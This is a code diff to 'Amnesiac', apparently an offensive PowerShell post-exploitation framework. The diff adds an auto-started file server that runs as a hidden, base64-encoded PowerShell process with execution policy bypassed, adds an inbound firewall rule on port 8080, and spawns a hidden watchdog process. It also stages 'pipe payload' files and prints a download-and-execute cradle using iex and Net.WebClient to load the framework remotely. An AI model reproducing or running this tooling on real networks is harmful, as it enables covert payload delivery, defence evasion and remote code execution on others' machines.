@@ -747,6 +747,23 @@ function Amnesiac {
     Initialize-ToolCache
     Show-OpsecBanner
 
+    if ($Detached -and $global:IP) {
+        $_autoRoot = $global:AmnesiacRoot
+        $_autoSrvScript = $FileServerScript + "`nFile-Server -Port 8080 -Path '$_autoRoot'"
+        $_autoBytes     = [System.Text.Encoding]::Unicode.GetBytes($_autoSrvScript)
+        $_autoEnc       = [Convert]::ToBase64String($_autoBytes)
+        $global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
+            -ArgumentList "-ep Bypass", "-NoProfile", "-enc $_autoEnc" -PassThru
+        New-NetFirewallRule -Name "AmnesiacServe8080" -DisplayName "Amnesiac HTTP 8080" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080 -ErrorAction SilentlyContinue | Out-Null
+        $_autoPid = $global:FileServerProcess.Id
+        $_autoParentPid = $PID
+        if (Test-Path (Join-Path $_autoRoot "Tools")) { $global:ServerURL = "http://$($global:IP)`:8080/Tools" }
+        $_autoMon = "while(`$true){Start-Sleep -Seconds 5;if(-not(Get-Process -Id $_autoParentPid -ErrorAction SilentlyContinue)){Stop-Process -Id $_autoPid -ErrorAction SilentlyContinue;break}}"
+        $_autoMonEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($_autoMon))
+        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ep Bypass -enc $_autoMonEnc" -WindowStyle Hidden
+        Write-Host " [+] serve auto-started (PID $_autoPid) — http://$($global:IP)`:8080/" -ForegroundColor Green
+    }
+
 	if(!$ScanMode){$global:Message = " [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"}
 	
 	$ShowSessions = $True
@@ -1296,13 +1313,12 @@ function Amnesiac {
 			$serveRoot = $global:AmnesiacRoot
 			$toolsPath = Join-Path $serveRoot "Tools"
 			if (-not (Test-Path $toolsPath)) {
-				$global:Message = " [!] Tools\ not found at '$toolsPath'. Cannot start server."
-				continue
+				$global:Message = " [!] Tools\ not found at '$toolsPath' — only pipe files will be served`n"
 			}
 
 			Initialize-ToolCache
 
-			$global:ServerURL = "http://$($DefineHostname):$userdefPort/Tools"
+			if (Test-Path $toolsPath) { $global:ServerURL = "http://$($DefineHostname):$userdefPort/Tools" }
 
 			$scriptWithCommand = $FileServerScript + "`nFile-Server -Port $userdefPort -Path '$serveRoot'"
 			$bytes          = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)
@@ -1313,8 +1329,8 @@ function Amnesiac {
 			$processId = $global:FileServerProcess.Id
 
 			$loaderURL       = "http://$($DefineHostname):$userdefPort/Amnesiac_ShellReady.ps1"
-			$global:Message  = " [+] File server started (PID $processId)`n"
-			$global:Message += " [+] Tools:  $($global:ServerURL)`n"
+			$global:Message += " [+] File server started (PID $processId)`n"
+			if (Test-Path $toolsPath) { $global:Message += " [+] Tools:  $($global:ServerURL)`n" }
 			$global:Message += " [+] Loader: $loaderURL`n"
 			$global:Message += "     Scenario 2: iex (New-Object Net.WebClient).DownloadString('$loaderURL'); Amnesiac"
 
@@ -2345,22 +2361,22 @@ function Start-LocalShell {
                 $_serveRoot = $global:AmnesiacRoot
                 $_toolsPath = Join-Path $_serveRoot "Tools"
                 if (-not (Test-Path $_toolsPath)) {
-                    Write-Host " [!] Tools\ not found at '$_toolsPath'. Cannot start server." -ForegroundColor Yellow
+                    Write-Host " [!] Tools\ not found — only pipe files will be served" -ForegroundColor Yellow
                 } else {
                     $global:ServerURL = "http://$_srvIP`:8080/Tools"
-                    $_srvScript = $FileServerScript + "`nFile-Server -Port 8080 -Path '$_serveRoot'"
-                    $_srvBytes  = [System.Text.Encoding]::Unicode.GetBytes($_srvScript)
-                    $_srvEnc    = [Convert]::ToBase64String($_srvBytes)
-                    $global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
-                        -ArgumentList "-ep Bypass", "-NoProfile", "-enc $_srvEnc" -PassThru
-                    New-NetFirewallRule -Name "AmnesiacServe8080" -DisplayName "Amnesiac HTTP 8080" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080 -ErrorAction SilentlyContinue | Out-Null
-                    Write-Host " [+] serve started (PID $($global:FileServerProcess.Id))" -ForegroundColor Green
-                    Write-Host " [*] Root:   http://$_srvIP`:8080/" -ForegroundColor Cyan
-                    Write-Host " [*] Tools:  $global:ServerURL" -ForegroundColor Cyan
-                    Write-Host " [*] Loader: http://$_srvIP`:8080/Amnesiac_ShellReady.ps1" -ForegroundColor Cyan
-                    if ($global:LastSharpRDPCradleFile) {
-                        Write-Host " [*] Pipe payload ready: http://$_srvIP`:8080/$($global:LastSharpRDPCradleFile)" -ForegroundColor Cyan
-                    }
+                }
+                $_srvScript = $FileServerScript + "`nFile-Server -Port 8080 -Path '$_serveRoot'"
+                $_srvBytes  = [System.Text.Encoding]::Unicode.GetBytes($_srvScript)
+                $_srvEnc    = [Convert]::ToBase64String($_srvBytes)
+                $global:FileServerProcess = Start-Process powershell.exe -WindowStyle Hidden `
+                    -ArgumentList "-ep Bypass", "-NoProfile", "-enc $_srvEnc" -PassThru
+                New-NetFirewallRule -Name "AmnesiacServe8080" -DisplayName "Amnesiac HTTP 8080" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080 -ErrorAction SilentlyContinue | Out-Null
+                Write-Host " [+] serve started (PID $($global:FileServerProcess.Id))" -ForegroundColor Green
+                Write-Host " [*] Root:   http://$_srvIP`:8080/" -ForegroundColor Cyan
+                if (Test-Path $_toolsPath) { Write-Host " [*] Tools:  $global:ServerURL" -ForegroundColor Cyan }
+                Write-Host " [*] Loader: http://$_srvIP`:8080/Amnesiac_ShellReady.ps1" -ForegroundColor Cyan
+                if ($global:LastSharpRDPCradleFile) {
+                    Write-Host " [*] Pipe payload ready: http://$_srvIP`:8080/$($global:LastSharpRDPCradleFile)" -ForegroundColor Cyan
                 }
             }
             continue
